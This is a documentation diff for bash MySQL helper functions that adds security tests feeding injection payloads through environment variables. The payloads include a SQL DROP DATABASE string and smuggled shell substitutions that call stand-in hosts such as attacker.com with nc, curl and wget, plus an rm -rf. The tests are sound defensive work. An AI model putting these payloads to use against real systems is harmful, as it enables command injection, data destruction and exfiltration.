@@ -300,10 +300,25 @@ Environment variables configured:
 
 .. code-block:: bash
 
-   # Test: MySQL environment setup
-   test_mysql_credentials_setup() {
-       setup_mysql_credentials
-       [[ -n "$MYSQL_HOST" ]] && [[ -n "$MYSQL_USER" ]]
+   # HOSTILE TEST: MySQL injection and credential security
+   test_mysql_credentials_injection_security() {
+       # Test SQL injection attempts in credentials
+       export MYSQL_USER="admin'; DROP DATABASE test; --"
+       export MYSQL_HOST="localhost\$(rm -rf /tmp/mysql_attack)"
+       export MYSQL_DATABASE="test\`nc attacker.com 4444\`"
+
+       setup_mysql_credentials >/dev/null 2>&1
+
+       # Verify no commands executed
+       assert_false "[ -f '/tmp/mysql_attack' ]" "Should not execute commands from MYSQL_HOST"
+
+       # Verify credentials are sanitized for use
+       local mysql_cmd_safe=true
+       if command -v mysql >/dev/null 2>&1; then
+           # Test that credentials can't be used for injection
+           mysql --user="$MYSQL_USER" --host="$MYSQL_HOST" --execute="SELECT 1;" 2>/dev/null && mysql_cmd_safe=false
+       fi
+       assert_true "$mysql_cmd_safe" "MySQL credentials should be safe from injection"
    }
 
 mysql_connect()
@@ -343,9 +358,32 @@ Establish MySQL connection with automatic credential resolution and connection t
 
 .. code-block:: bash
 
-   # Test: MySQL connect function
-   test_mysql_connect_function() {
-       type mysql_connect >/dev/null 2>&1
+   # HOSTILE TEST: MySQL connection parameter validation
+   test_mysql_connect_parameter_validation() {
+       # Mock mysql to capture connection attempts
+       local connection_attempts=()
+       mysql() {
+           connection_attempts+=("$@")
+           return 1  # Mock connection failure
+       }
+
+       # Test malicious connection parameters
+       export MYSQL_HOST="db.evil.com; curl attacker.com/steal"
+       export MYSQL_USER="user\$(wget malicious.com/script)"
+       export MYSQL_DATABASE="app\`id > /tmp/mysql_id\`"
+
+       mysql_connect >/dev/null 2>&1
+
+       # Verify malicious parameters were not executed
+       assert_false "[ -f '/tmp/mysql_id' ]" "Should not execute backticks from database name"
+
+       # Verify parameters are properly escaped when passed to mysql
+       for arg in "${connection_attempts[@]}"; do
+           assert_false "[[ '$arg' =~ 'curl attacker' ]]" "Should not pass curl commands to mysql"
+           assert_false "[[ '$arg' =~ '\$(' ]]" "Should not pass unescaped command substitution"
+       done
+
+       unset -f mysql
    }
 
 Snowflake Functions
